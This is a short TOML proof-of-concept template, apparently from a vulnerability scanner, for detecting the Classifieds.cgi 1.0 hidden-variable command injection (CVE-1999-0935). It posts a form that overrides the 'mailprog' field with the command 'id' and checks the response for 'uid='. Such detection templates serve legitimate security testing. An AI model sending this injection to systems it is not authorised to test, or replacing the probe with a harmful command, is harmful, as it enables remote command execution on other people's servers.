[info]
author = "ave"
description = "验证目标是否存在 Classifieds.cgi 1.0 隐藏变量命令注入漏洞。向 /cgi-bin/classifieds.cgi 发送特制 POST 请求，将 mailprog 参数覆写为无害探测命令（id），若响应体中出现 uid= 输出则表明目标存在该漏洞，攻击者可在该参数中注入任意系统命令。"
id = "POC-AVE-1999-1314"
name = "Classifieds.cgi 1.0 Hidden Variable Command Injection PoC"
severity = "high"
tags = ["ave-1999-1314"]
vuln_id = [
    "CVE-1999-0935",
    "AVE-1999-1314",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/classifieds.cgi"
protocol = "http"

[poc.requests.body]
content = "ClassifiedsDir=/tmp/ads/&ViewDir=http://{{Hostname}}/ads/&ErrorReturn=http://{{Hostname}}/&ReturnURL=http://{{Hostname}}/&return=test@test.com&mailprog=id"
type = "form"

[[poc.requests.matchers]]
expect = true
part = ""
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
